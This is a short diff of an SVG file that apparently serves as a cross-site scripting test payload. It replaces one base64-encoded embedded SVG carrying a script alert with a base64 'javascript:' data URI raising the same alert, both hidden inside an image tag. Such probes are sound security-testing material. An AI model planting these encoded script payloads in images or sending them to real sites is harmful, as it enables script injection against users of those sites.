@@ -3,5 +3,5 @@
 
 <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
    <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
-   <image href="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBzdGFuZGFsb25lPSJubyI/Pg0KPCFET0NUWVBFIHN2ZyBQVUJMSUMgIi0vL1czQy8vRFREIFNWRyAxLjEvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvR3JhcGhpY3MvU1ZHLzEuMS9EVEQvc3ZnMTEuZHRkIj4NCg0KPHN2ZyB2ZXJzaW9uPSIxLjEiIGJhc2VQcm9maWxlPSJmdWxsIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPg0KICAgPHBvbHlnb24gaWQ9InRyaWFuZ2xlIiBwb2ludHM9IjAsMCAwLDUwIDUwLDAiIGZpbGw9IiMwMDk5MDAiIHN0cm9rZT0iIzAwNDQwMCIvPg0KICAgPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPg0KICAgICAgYWxlcnQoJ1RoaXMgYXBwIGlzIHByb2JhYmx5IHZ1bG5lcmFibGUgdG8gWFNTIGF0dGFja3MhJyk7DQogICA8L3NjcmlwdD4NCjwvc3ZnPg==" height="200" width="200"/>
+   <image href="data:text/javascript;base64,amF2YXNjcmlwdDphbGVydCgnVGhpcyBhcHAgaXMgcHJvYmFibHkgdnVsbmVyYWJsZSB0byBYU1MgYXR0YWNrcyEnKTs" height="200" width="200"/>
 </svg>
